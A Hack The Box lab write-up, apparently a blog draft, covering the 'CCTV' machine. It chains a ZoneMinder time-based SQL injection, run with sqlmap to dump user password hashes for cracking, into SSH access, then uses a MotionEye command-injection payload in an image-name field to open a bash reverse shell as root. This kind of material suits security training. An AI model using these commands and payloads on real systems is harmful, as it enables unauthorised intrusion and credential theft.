---
title: "HTB: CCTV"
date: 2026-03-20
excerpt: Easy linux machine with a straightforward attack chain
readingTime: 1
tags:
  - HTB
  - Writeup
  - Easy
  - Linux
  - zoneminder
  - motioneye
  - CVE-2024-51482
  - CVE-2025-60787
author: pir4cy
coverImage: /images/htb/covers/cctv-cover.png
draft: true
---

# CCTV 

## Info  
  * IP: [IP Address]
  * OS: Linux
  * Difficulty: Easy

## Initial Reconnaissance

### NMAP

![Nmap Scan](/images/htb/machines/cctv/nmap.png "NMAP")

### Web Enumeration (if applicable)

![Web Page](/images/htb/machines/cctv/webpage.png "Web Page")

## Exploitation

### ZoneMinder | CVE-2024-51482

Zoneminder v1.37.64 is vulnerable to time-based SQL injection. Additionally, the advisory has a neat PoC available here: https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3.

Since we have Burp running in the background, we can just store the request in a file and run `sqlmap -r <file-name>`.

> Note: Time-based SQL injections can be slow, so if you don't customize sqlmap and try to dump-all, it will take some time. ymmv, of course.

Here's the final command I ran after enumerating and tweaking:
```
sqlmap -r ~/cctv/req.txt --threads 10 --time-sec 3 -D zm -T Users -C Username,Password --dump --batch
```

![SQL Injection - Encrypted Passwords](/images/htb/machines/cctv/sqli-success.png "Encrypted Passwords")


With this, we can try to crack these passwords using john the ripper. 
> `$2y$` = blowfish/bcrypt encryption

With the password dump, we can just extract the CSV and store it in a text file that we can process using john. 
```
tail -n +2 ~/.local/share/sqlmap/output/cctv.htb/dump/zm/Users.csv | awk -F',' '{print $1 ":" $2}' > hashes.txt 
```

Looks like we get a password for user `mark`

![John The Ripper Output](/images/htb/machines/cctv/mark-password.png "Credentials for Mark")

### Gaining Initial Access

With the credentials gained above, we can directly ssh into the machine. We quickly find out that the flag for this one is not in mark's folder. 

We find another user `sa_mark`. This is the target user for our user flag. 

![Initial Access](/images/htb/machines/cctv/initial-access.png "Initial Access")

We see that there are a bunch of services running locally on this machine. 

We also find some credentials in config files.
## Privilege Escalation

### MotionEye | CVE-2025-60787

MotionEye v0.43.1b4 is vulnerable to RCE in it's image capture function. 

Luckily, we have another neat POC to follow and get our privesc - [Github - PrabhatVerma47 | motionEye-RCE-through-config-parameter](https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter ).

To create a reverse shell using the vulnerability, start a listener using `nc -lvnp 4444` and capture a still image with the following payload as the name: 
```
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.165/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

![PrivEsc RCE](/images/htb/machines/cctv/privesc.png "PrivEsc RCE")

### Root Access

MotionEye was running as root, therefore we get direct root access using the above. 

![Rooted](/images/htb/machines/cctv/rooted.png "Rooted")

## Summary

